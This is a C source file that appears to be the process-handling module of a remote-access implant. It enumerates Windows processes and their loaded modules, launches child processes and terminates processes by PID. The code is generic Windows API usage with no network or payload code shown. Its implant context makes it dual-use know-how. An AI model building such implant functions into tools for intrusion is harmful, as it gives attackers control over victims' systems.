#include "process.h"

//get process information
ProcessInfo_t GetProcessInfo()
{
    //Make process information struct
    ProcessInfo_t psInfo = { 0 };

    // Get the list of process identifiers
    DWORD lpcbNeeded;
    DWORD* processArray = ImplantHeapAlloc(MAX_PROCESS_SIZE * sizeof(DWORD));
    if (!EnumProcesses(processArray, MAX_PROCESS_SIZE * sizeof(DWORD), &lpcbNeeded))
    {
        psInfo.processArray = NULL;
        psInfo.numProcesses = 0;
    }
    else
    {
        psInfo.processArray = processArray;
        // Calculate how many process identifiers were returned
        psInfo.numProcesses = lpcbNeeded / sizeof(DWORD);
    }
    return psInfo;
}

//get name of process depending on PID
WCHAR* GetProcessName(DWORD pid)
{
    HMODULE hMod;
    DWORD cbNeeded;
    WCHAR* szProcessName = ImplantHeapAlloc(MAX_PROCESS_SIZE * sizeof(WCHAR));
    // Get a handle to the process.
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, pid);

    // Get the process name.
    if (NULL != hProcess)
    {
        if (EnumProcessModules(hProcess,
            &hMod,
            sizeof(hMod),
            &cbNeeded))
        {
            GetModuleBaseNameW(hProcess,
                hMod,
                szProcessName,
                MAX_PATH / sizeof(WCHAR));
        }
    }

    if (hProcess != NULL)
    {
        CloseHandle(hProcess);
        hProcess = NULL;
    }
    return szProcessName;

}

//find a process by PID
BOOL FindPs(PWSTR arg)
{
    //check if arg is not null
    if (arg == NULL)
    {
		return FALSE;
    }
    //convert from string to DWORD
    DWORD pid = (DWORD)wcstoul(arg, NULL, 10);

	if (arg == NULL || pid == 0)
    {
        return FALSE;
    }
    
    //get process info struct
    ProcessInfo_t psInfo = GetProcessInfo();

    //search for PID in process array
    BOOL found = FALSE;
    for (DWORD i = 0; i < psInfo.numProcesses; i++)
    {
        if (psInfo.processArray[i] == pid && psInfo.processArray[i] != SYS_IDLE_PS_ID && psInfo.processArray[i] != SYS_PS_ID)
        {
            found = TRUE;
            break;
        }
    }
    //free process array
    ImplantHeapFree(psInfo.processArray);
    return found;
}


ModuleInfo_t* GetModules(DWORD processID, DWORD* cbNeeded)
{
    if (cbNeeded == NULL)
    {
        return NULL;
    }

    HMODULE hMods[HMODS_SIZE];
    HANDLE hProcess;
    unsigned int i;
    DWORD index = 0;

    // Get a handle to the process.
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, processID);
    if (NULL == hProcess)
    {
        return NULL;
    }

    // Get a list of all the modules in this process.
    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), cbNeeded))
    {
        //get number of modules, initialize module struct array
        DWORD size = *cbNeeded / sizeof(HMODULE);
        ModuleInfo_t* modInfoArray = ImplantHeapAlloc(size * sizeof(ModuleInfo_t));

        //for each module, get information and store into array
        for (i = 0; i < size; i++)
        {
            WCHAR* szModName = ImplantHeapAlloc(MAX_PATH * sizeof(WCHAR));
            WCHAR* szBaseName = ImplantHeapAlloc(MAX_PATH * sizeof(WCHAR));

            // Get the full path to the module's file.
            if (GetModuleFileNameEx(hProcess, hMods[i], szModName,
                MAX_PATH))
            {
                //Get the base name of the module.
                if (GetModuleBaseName(hProcess, hMods[i], szBaseName,
                    MAX_PATH))
                {
                    //Store base name, module path and handle value (base address) in module struct.
                    modInfoArray[index].name = szBaseName;
                    modInfoArray[index].path = szModName;
                    //this first stores hMods[i] in index, then increments index.
                    modInfoArray[index++].baseAddress = hMods[i];
                }
            }
            else
            {
                ImplantHeapFree(szModName);
                ImplantHeapFree(szBaseName);
            }

        }
        CloseHandle(hProcess);
        *cbNeeded = index;
        return modInfoArray;
    }
    else
    {
        CloseHandle(hProcess);
        return NULL;
    }

}

BOOL SpawnChild(WCHAR* path)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Start the child process, make sure it works properly
    if (!CreateProcess(NULL,   // Use module name
        path,            // No command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
        )
    {
        return FALSE;
    }

    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;

}

DWORD Kill(DWORD processId)
{
    DWORD ret;
    // Open the process with the PROCESS_TERMINATE access right
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);

    if (hProcess != NULL) {
        if (TerminateProcess(hProcess, 0)) {
            CloseHandle(hProcess);
            return SUCCESS_KILL_PROCESS;
        }
        goto cleanup;
    }
    else {
        goto cleanup;
    }

cleanup:
    ret = GetLastError();
    CloseHandle(hProcess);
    return ret;
}
